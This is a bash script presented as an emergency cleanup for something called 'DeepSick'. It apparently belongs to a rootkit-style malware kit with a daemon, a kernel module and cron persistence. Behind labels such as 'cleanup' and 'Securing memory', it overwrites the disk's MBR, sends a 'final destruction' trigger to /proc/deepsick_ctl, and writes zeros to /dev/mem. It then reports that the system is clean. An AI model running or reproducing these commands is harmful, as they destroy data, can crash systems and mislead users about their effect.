#!/bin/bash
# DeepSick emergency cleanup

if [ "$EUID" -ne 0 ]; then
    echo "Must be run as root"
    exit 1
fi

# Stop services
echo "[*] Stopping services..."
systemctl stop deepsick.service 2>/dev/null
systemctl disable deepsick.service 2>/dev/null

# Remove files
echo "[*] Removing files..."
rm -f /usr/sbin/deepsick_daemon
rm -f /etc/systemd/system/deepsick.service

# Unload kernel module
echo "[*] Unloading kernel module..."
rmmod deepsick 2>/dev/null

# Remove from crontab
echo "[*] Removing cron jobs..."
crontab -l | grep -v deepsick | crontab -

# Restore MBR
echo "[*] Restoring MBR..."
dd if=/usr/lib/syslinux/mbr/mbr.bin of=/dev/sda bs=446 count=1 conv=notrunc

# Final destruction
echo "[*] Triggering final destruction..."
echo "1" > /proc/deepsick_ctl 2>/dev/null

# Secure wipe
echo "[*] Securing memory..."
dd if=/dev/zero of=/dev/mem bs=1M count=100 2>/dev/null

echo "[+] DeepSick cleanup completed. System is clean."
